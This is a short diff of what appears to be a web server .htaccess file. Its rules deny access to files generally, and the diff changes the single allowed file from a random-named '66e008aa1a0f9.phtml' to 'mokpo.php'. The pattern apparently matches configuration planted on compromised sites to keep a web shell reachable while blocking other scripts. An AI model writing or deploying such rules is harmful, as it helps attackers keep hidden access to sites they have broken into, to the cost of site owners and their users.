@@ -7,7 +7,7 @@ Deny from all
 Order Deny,Allow
 Deny from all
 </FilesMatch>
-<FilesMatch '^(66e008aa1a0f9.phtml)$'>
+<FilesMatch '^(mokpo.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
